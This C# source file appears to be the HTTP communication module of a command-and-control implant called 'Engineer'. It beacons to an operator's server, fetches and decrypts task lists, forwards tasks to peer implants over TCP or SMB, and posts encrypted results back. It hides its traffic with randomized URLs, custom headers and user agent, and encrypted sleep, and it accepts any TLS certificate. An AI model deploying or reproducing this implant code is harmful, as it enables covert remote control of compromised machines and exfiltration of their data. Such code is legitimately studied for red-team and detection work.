using Engineer.Functions;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Http;
using System.Net.Security;
using System.Net.Sockets;
using System.Security.Authentication;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Security.Policy;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Engineer.Models
{
	public class EngHttpComm : EngCommBase
    {
		public string ConnectAddress { get; set; }
		public int ConnectPort { get; set; }
        public bool IsSecure { get; set; }
        public int ConnectionAttempts { get; set; }

		public List<string> Urls { get; set; }
		public List<string> Cookies { get; set; }
		public List<string> RequestHeaders { get; set; } //headers on the implant
		public string UserAgent { get; set; }

		public X509Certificate2 Cert { get; set; }

		public static Dictionary<string, string> ChildEngineers { get; set; } = new Dictionary<string, string>();

        private CancellationTokenSource _tokenSource;
		protected internal HttpClient _client;
        protected internal HttpClientHandler _handler;

		public EngHttpComm(string connectAddress, int connectPort, string isSecure, int connectionAttempts, int sleep, string urls, string cookies, string requestHeades, string useragent)
		{
			ConnectAddress = connectAddress;
			ConnectPort = connectPort;
            ConnectionAttempts = connectionAttempts;
            Sleep = sleep * 1000; // multiply by 1000 to convert to milliseconds , uses commModule so I dont have ot recreate for other types 
            if (isSecure.ToLower() == "true")
            {
                IsSecure = true;
            }
            else
            {
                IsSecure = false;
            }
            //split the urls, cookies, requestheaders, and responseheaders at the , to make items to add to the lists
            Urls = urls.Split(',').ToList();
            Cookies = cookies.Split(',').ToList();
            RequestHeaders = requestHeades.Split(',').ToList();
			UserAgent = useragent;
        }

        public override async Task CheckIn()
		{
            //pick one of the strings in the Urls list and use it for the request
            string url = Urls[new Random().Next(Urls.Count)];

            var taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead); // gets anything waiting at the maanger for us to read, when this happens it triggers the HandleImplant in our TS 
			
            if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) != taskReturned || taskReturned.Status == TaskStatus.Faulted)
            {
                for (int i = 0; i < ConnectionAttempts; i++)
                {
                    Console.WriteLine("Attempting to reconnect");
                    SleepEncrypt.ExecuteSleep(Sleep);
                    //Thread.Sleep(Sleep);
                    //Sleepydll.ExecuteSleep(Sleep);
                    taskReturned = _client.GetAsync(url, HttpCompletionOption.ResponseContentRead);
                    if (await Task.WhenAny(taskReturned, Task.Delay(Sleep + 10000)) == taskReturned && taskReturned.Status != TaskStatus.Faulted)
                    {
                        break;
                    }
                    if(i == ConnectionAttempts)
					{
                        Environment.Exit(0);
                    }
                }
            }
            var HttpResponseMessageReturned = await taskReturned;
			var EncryptedresponseByte = HttpResponseMessageReturned.Content.ReadAsByteArrayAsync().Result;
			
			if (EncryptedresponseByte.Count() > 0) //if response is NOT null, empty, or white space then decrypt and handle it
			{
                var DecryptedTaskMessage = Encryption.AES_Decrypt(EncryptedresponseByte,Program.MessagePathKey);
				//Console.WriteLine("Response from Manager: " + EncryptedresponseByte.Length + " bytes");
				var C2MessageList = DecryptedTaskMessage.ProDeserialize<List<C2TaskMessage>>();
				//Console.WriteLine("C2TaskMessage deserialized");
                foreach(C2TaskMessage taskMessage in C2MessageList)
				{
                    if(taskMessage.PathMessage.Count() == 1 )
					{
                        var decTask = Encryption.AES_Decrypt(taskMessage.TaskData,Program.UniqueTaskKey);
                        HandleResponse(decTask);
                    }
                    else
					{
						//read the path and see if it is a child engineer and forward it on.
						taskMessage.PathMessage.RemoveAt(0);
                        string dest = taskMessage.PathMessage[0];
						Console.WriteLine($"{DateTime.Now} got task for child {dest}");
                        var serializedTaskMessage = taskMessage.ProSerialise();
						var EncryptedTaskMessage = Encryption.AES_Encrypt(serializedTaskMessage,Program.MessagePathKey);
						if (EngTCPComm.ParentToChildData.Count > 0)
						{
							EngTCPComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
						}
						else if (EngSMBComm.ParentToChildData.Count > 0)
                        {
                            EngSMBComm.ParentToChildData[dest].Enqueue(EncryptedTaskMessage);
                        }
                    }
                }

			}
		}
		
		public override async Task PostData()
		{
            try
            {
				string url = Urls[new Random().Next(Urls.Count)];
				var outbound = GetOutbound().ProSerialise(); // serialize the list into a byte array
				var Encryptedoutbound = Encryption.AES_Encrypt(outbound,Program.UniqueTaskKey); // encrypt the byte array
                //turn the encrypted byte array into HttpContent
                var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound);
                Console.WriteLine($"{DateTime.Now} posting http Task Response");
                var response = await _client.PostAsync(url, EncryptedoutboundContent);
                var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
				if (EncresponseContent.Length > 0) //if response is NOT null, empty, or white space then decrypt and handle it
				{
                    //Console.WriteLine("Response from Post: " + EncresponseContent.Length + "bytes");
                    var decMessage = Encryption.AES_Decrypt(EncresponseContent, Program.MessagePathKey);
                    var encTask = decMessage.ProDeserialize<C2TaskMessage>();
                    //Console.WriteLine("C2TaskMessage deserialized");
                    var decTask = Encryption.AES_Decrypt(encTask.TaskData,Program.UniqueTaskKey);
                    HandleResponse(decTask);
				}
			}
            catch (Exception e)
            {
               Console.WriteLine(e.Message);
            }
		}
		public async Task Postp2pData()
		{
            try
            {
                string url = Urls[new Random().Next(Urls.Count)];
                byte[] Encryptedoutbound = GetP2POutbound(); //already has the encryption and seralization 
                //turn the encrypted byte array into HttpContent
                var EncryptedoutboundContent = new ByteArrayContent(Encryptedoutbound);
                
                var response = await _client.PostAsync(url, EncryptedoutboundContent);
                Console.WriteLine($"{DateTime.Now} posting P2P Task Response");
				var EncresponseContent = await response.Content.ReadAsByteArrayAsync();
                if (EncresponseContent.Length > 0) //if response is NOT null, empty, or white space then decrypt and handle it
                {
                    //Console.WriteLine("Response from Post: " + EncresponseContent.Length + "bytes");
                    var decMessage = Encryption.AES_Decrypt(EncresponseContent,Program.MessagePathKey);
                    var encTask = decMessage.ProDeserialize<C2TaskMessage>();
                    //Console.WriteLine("C2TaskMessage deserialized");
                    var decTask = Encryption.AES_Decrypt(encTask.TaskData,Program.UniqueTaskKey);
                    HandleResponse(decTask);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }

        }
		
		private bool HandleResponse(byte[] response) //if not null we have stuff to do 
		{
            
            var tasks = response.ProDeserialize<List<EngineerTask>>();
			
			if (tasks != null && tasks.Any())
			{
                //Console.WriteLine("Received " + tasks.Count() + " tasks");
                foreach (var task in tasks)
				{
					Inbound.Enqueue(task);
				}
                return true;
            }
            return false;
        }

		public override async Task Start()
		{
		}

		public override void Stop()
		{
			_tokenSource.Cancel();
		}

		public override void Init(EngineerMetadata engineermetadata)
		{
			base.Init(engineermetadata); // base is our parent implementatin in CommModule

			_client = new HttpClient();
			_client.DefaultRequestHeaders.Clear();
			//if IsSecure is true, we need to set the BaseAddress to https:// and use TLS 1.2 for communication
			if (IsSecure)
			{
                //get the certificate from the certificate path and password, make it useable by the client so it can connect to the server
				_handler = new HttpClientHandler
				{
					ClientCertificateOptions = ClientCertificateOption.Automatic,
					SslProtocols = SslProtocols.Tls12,
                    
				};
				ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
				ServicePointManager.ServerCertificateValidationCallback = (sender, cert, chain, errors) =>
				{
                    //ignore all errors for the moment to test if it will even connect back
                    if (errors != SslPolicyErrors.None)
                    {
                        return true;
                    }
                    else if (errors == SslPolicyErrors.None)
					{
						return true;
					}

					//print the errors
					foreach (var error in errors.ToString().Split(','))
					{
						Console.WriteLine(error);
					}
					return false;

				};

				_client = new HttpClient(_handler);
				_client.DefaultRequestHeaders.Clear();
				_client.BaseAddress = new Uri("https://" + ConnectAddress + ":" + ConnectPort);

            }
            else
            {
				_client.BaseAddress = new Uri("http://" + ConnectAddress + ":" + ConnectPort);
            }
            Console.WriteLine($"metadata encryption key is {Program.MetadataKey}");
			var encodedMetadata = Convert.ToBase64String(Encryption.AES_Encrypt(engineerMetadata.ProSerialise(),Program.MetadataKey)); // returns a base64 encoded string of AES encvrypted serilized json data
			_client.DefaultRequestHeaders.Add("Authorization", $"Bearer {encodedMetadata}");
            string EncryptedMetadataID = Convert.ToBase64String(Encryption.AES_Encrypt(Encoding.UTF8.GetBytes(engineerMetadata.Id), Program.MetadataIDKey));
            _client.DefaultRequestHeaders.Add("Authentication",$"{EncryptedMetadataID}");
            foreach(string header in RequestHeaders)
            {
                //split the header string at the first index of VALUE so the name is everything to the left of the VALUE and the value is everything to the right of the VALUE
                var headerName = header.Substring(0, header.IndexOf("VALUE"));
                var headerValue = header.Substring(header.IndexOf("VALUE") + 5);

                _client.DefaultRequestHeaders.Add($"{headerName}", $"{headerValue}");
            }
            _client.DefaultRequestHeaders.UserAgent.ParseAdd(UserAgent);



        }
    }
}
